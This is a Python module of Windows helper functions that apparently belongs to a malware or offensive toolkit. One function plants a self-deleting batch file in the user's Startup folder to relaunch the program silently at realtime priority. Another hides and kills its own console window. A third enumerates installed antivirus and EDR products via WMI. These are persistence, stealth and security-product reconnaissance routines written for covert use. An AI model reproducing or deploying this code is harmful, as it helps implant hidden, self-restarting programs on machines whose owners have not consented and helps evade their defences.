import os
import sys
from pathlib import Path
import ctypes
import win32process
import signal
import wmi

WINDOWS_AUTOSTART_PATH_IN_USER_HOME = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

def stay_persistent_with_args(autostart_file_name: str = "a", cmd_args: str = "", is_for_only_one_reboot=True):
    """
    Sets the current executable path from argv[0] to run on the next system startup as silently as possible.

    :param autostart_file_name: Optional, the name of the ".bat" file that will be placed in the current user's startup
        folder, defaults to "a".
    :param cmd_args: Optional, The arguments to pass the executable on startup, defaults to ""
    :param is_for_only_one_reboot: Optional, if True, the ".bat" file that is placed in the current user's startup folder
        deletes itself after it runs, defaults to True
    """
    home = str(Path.home())
    autostart_path = os.path.join(home, WINDOWS_AUTOSTART_PATH_IN_USER_HOME)
    autostart_file_name = f"{autostart_file_name}.bat"
    autostart_file_path = os.path.join(autostart_path, autostart_file_name)
    current_exe_path = os.path.abspath(sys.argv[0])

    bat_cmd = f"@echo off\nstart \"\" /min /realtime cmd.exe /k {current_exe_path} {cmd_args}"
    if is_for_only_one_reboot:
        bat_cmd = f"{bat_cmd}\ndel \"%~f0\""

    with open(autostart_file_path, "w") as f:
        f.write(bat_cmd)


def kill_process_window():
    """
    Hides and Kills the window of the current process.
    """
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
    if hwnd != 0:      
        ctypes.windll.user32.ShowWindow(hwnd, 0)      
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.kill(pid, signal.SIGTERM)


def get_existing_anti_virus_display_names() -> set[str]:
    """
    Returns a set of the installed AV / EDR products using WMI.
    """
    wmi_client = wmi.WMI(namespace="SecurityCenter2")
    wmi_result = wmi_client.fetch_as_lists("AntiVirusProduct", ["DisplayName"])
    av_list = {wmi_result_item[0] for wmi_result_item in wmi_result}
    return av_list
